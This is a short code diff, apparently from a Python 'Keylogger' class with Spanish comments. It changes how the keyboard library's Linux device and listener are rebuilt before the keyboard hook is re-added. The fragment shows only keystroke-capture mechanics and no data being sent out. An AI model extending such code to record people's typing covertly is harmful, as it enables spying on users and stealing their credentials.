@@ -287,12 +287,12 @@ class Keylogger:
                 keyboard.unhook_all()
 
                 # Reestablezco lecturas de teclado en la librería keyboard
-                #keyboard._nixkeyboard.device = None
-                #keyboard._nixkeyboard.build_device()
-                #sleep(1)
-                #keyboard._nixkeyboard.build_tables()
-                #sleep(1)
-                keyboard._listener = keyboard._KeyboardListener()
+                keyboard._nixkeyboard.device = None
+                keyboard._nixkeyboard.build_device()
+                sleep(1)
+                keyboard._nixkeyboard.build_tables()
+                sleep(1)
+                #keyboard._listener = keyboard._KeyboardListener()
                 sleep(1)
 
                 # Añado de nuevo el hook para leer teclado
